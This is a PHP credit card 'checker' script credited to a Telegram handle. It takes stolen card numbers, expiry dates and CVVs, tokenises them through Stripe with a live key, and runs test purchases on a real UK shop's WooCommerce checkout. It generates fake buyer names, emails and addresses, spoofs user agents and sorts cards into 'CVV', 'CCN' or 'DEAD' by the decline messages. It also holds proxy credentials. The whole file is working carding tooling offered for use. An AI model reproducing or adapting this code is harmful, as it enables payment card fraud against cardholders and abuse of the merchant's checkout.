<?php
//error_reporting(0);
date_default_timezone_set( 'Australia/Perth' );
if ( $_SERVER[ 'REQUEST_METHOD' ] == "POST" ) {
    extract( $_POST );
} elseif ( $_SERVER[ 'REQUEST_METHOD' ] == "GET" ) {
    extract( $_GET );
}
$MADEBY = '<a href="https://t.me/DarkTemptation21">『⫸FIRE⫷』</a>';
$separa = explode( "|", $lista );
$cc     = $separa[ 0 ];
$mes    = $separa[ 1 ];
$ano    = $separa[ 2 ];
$cvv    = $separa[ 3 ];
function get_string_between( $string, $start, $end )
{
    $string = " " . $string;
    $ini    = strpos( $string, $start );
    if ( $ini == 0 )
        return "";
    $ini += strlen( $start );
    $len = strpos( $string, $end, $ini ) - $ini;
    return substr( $string, $ini, $len );
}
function pre_r( $array )
{
    echo "<pre>";
    print_r( $array );
    echo "</pre>";
}
//================[Functions and Variables]================//
//==================[Randomizing Details]======================//
$letters      = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
$lettersArray = str_split( $letters );
$fname        = '';
$lname        = '';
for ( $i = 0; $i < 7; $i++ ) {
    $fname .= $lettersArray[ array_rand( $lettersArray ) ];
    $lname .= $lettersArray[ array_rand( $lettersArray ) ];
}
$email       = $fname . $lname . rand( 10, 99 ) . '@gmail.com';
$zip         = rand( 10000, 99999 );
$ua          = 'Mozilla/5.0 (Windows NT ' . rand( 11, 99 ) . '.0; Win64; x64) AppleWebKit/' . rand( 111, 999 ) . '.' . rand( 11, 99 ) . ' (KHTML, like Gecko) Chrome/' . rand( 11, 99 ) . '.0.' . rand( 1111, 9999 ) . '.' . rand( 111, 999 ) . ' Safari/' . rand( 111, 999 ) . '.' . rand( 11, 99 ) . '';
//==================[End Randomizing Details]======================//
//==================[Proxy setup]======================//
$proxyPasses = array(
     'dhssccps-rotate:rn6q65ufxqsl',
    'eciultpq-rotate:21no8en4737j' 
);
//==================[End Proxy setup]======================//
//==================[REQ1]======================//
$ch          = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyPasses[array_rand($proxyPasses)]);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch, CURLOPT_USERAGENT, $_SERVER[ 'HTTP_USER_AGENT' ] );
curl_setopt( $ch, CURLOPT_REFERER, $_SERVER[ 'REQUEST_URI' ] );
curl_setopt( $ch, CURLOPT_HEADER, 0 );
curl_setopt( $ch, CURLOPT_VERBOSE, 1 );
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1 );
curl_setopt( $ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
curl_setopt( $ch, CURLOPT_ENCODING, '' );
curl_setopt( $ch, CURLOPT_TCP_FASTOPEN, true );
curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, 0 );
curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, 0 );
curl_setopt( $ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt' );
curl_setopt( $ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt' );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array(
     'user-agent: ' . $useragent 
) );
curl_setopt( $ch, CURLOPT_POST, 1 );
curl_setopt( $ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources' );
curl_setopt( $ch, CURLOPT_POSTFIELDS, "type=card&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&key=pk_live_QdY8BLFwtaGpWD9m7RaafXDu00hkx5co9L" );
$result1 = curl_exec( $ch );
if ( !stripos( $result1, 'error' ) ) {
    $src = get_string_between( $result1, '"id": "', '"' );
    //==================[REQ1]======================//
    //==================[REQ2]======================//
    curl_setopt( $ch, CURLOPT_URL, 'https://smartshave.co.uk/checkout-page-gg3/' );
    $result2 = curl_exec( $ch );
    $nonce   = get_string_between( $result2, '"woocommerce-process-checkout-nonce" value="', '" />' );
    //==================[END REQ1]======================//
    //==================[REQ2]======================//
    curl_setopt( $ch, CURLOPT_URL, 'https://smartshave.co.uk/?wc-ajax=checkout&wcf_checkout_id=2153' );
    curl_setopt( $ch, CURLOPT_HTTPHEADER, array(
         'user-agent: ' . $ua 
    ) );
    curl_setopt( $ch, CURLOPT_POSTFIELDS, "billing_first_name=$fname&billing_last_name=$lname&billing_country=US&billing_address_1=3098+Hillcrest&billing_address_2=&billing_city=NEW+YORK&billing_state=NY&billing_postcode=$zip&billing_phone=6583145768&billing_email=$email&order_comments=&_wcf_flow_id=2151&_wcf_checkout_id=2153&payment_method=stripe&woocommerce-process-checkout-nonce=$nonce&_wp_http_referer=%2Fcheckout-page-gg3%2F%3Fwc-ajax%3Dupdate_order_review%26wcf_checkout_id%3D2153&stripe_source=$src" );
    $result3 = curl_exec( $ch );
    //==================[END REQ2]======================//
    //Results
    //CCN
    if ( strpos( $result3, 'card\u0027s security code is incorrect.' ) || strpos( $result3, "card's security code is incorrect." ) ) {
        echo '<span class="badge bg-warning">#CCN ✓ </span> ' . $lista . " ↬ Your card's security code is incorrect. ↬ Checker by " . $MADEBY;
    }
    ///CCN
    //DEAD
    elseif ( strpos( $result3, 'card was declined.' ) ) {
        echo '<span class="badge bg-danger">#DEAD </span> ' . $lista . ' ↬ Your card was declined. ↬ Checker by ' . $MADEBY;
    } elseif ( strpos( $result3, 'card does not support this type of purchase' ) ) {
        echo '<span class="badge bg-danger">#DEAD </span> ' . $lista . ' ↬ Your card does not support this type of purchase. ↬ Checker by ' . $MADEBY;
    } elseif ( strpos( $result3, 'card has expired' ) ) {
        echo '<span class="badge bg-danger">#DEAD </span> ' . $lista . ' ↬ Your card has expired. ↬ Checker by ' . $MADEBY;
    } elseif ( strpos( $result3, 'card number is incorrect.' ) ) {
        echo '<span class="badge bg-danger">#DEAD </span> ' . $lista . ' ↬ Your card number is incorrect. ↬ Checker by ' . $MADEBY;
    } elseif ( strpos( $result3, 'card_error_authentication_required' ) ) {
        echo '<span class="badge bg-danger">#DEAD </span> ' . $lista . ' ↬ 3D-Secure ↬ Checker by ' . $MADEBY;
    }
    ///DEAD
        
    //CVV
        elseif ( strpos( $result3, 'success' ) ) {
        echo '<span class="badge bg-success">#CVV </span> ' . $lista . '<br> ↬ CHARGED 5$<br> ↬ Checker by ' . $MADEBY;
    } elseif ( strpos( $result3, 'card has insufficient funds.' ) ) {
        echo '<span class="badge bg-success">#CVV </span> ' . $lista . ' ↬ Your card has insufficient funds. ↬ Checker by ' . $MADEBY;
    }
    ///CVV
    //UNKNOWN
    else {
        echo '<span class="badge bg-success">#UNKNOWN </span> ' . $lista . ' ↬ Unknown Error Occured ↬ Checker by ' . $MADEBY;
    }
    ///UNKNOWN
} else {
    echo '<span class="badge bg-danger">#DEAD </span> ' . $lista . ' ↬ invalid expiry date / generic decline / invalid card number ↬ Checker by ' . $MADEBY;
}
?>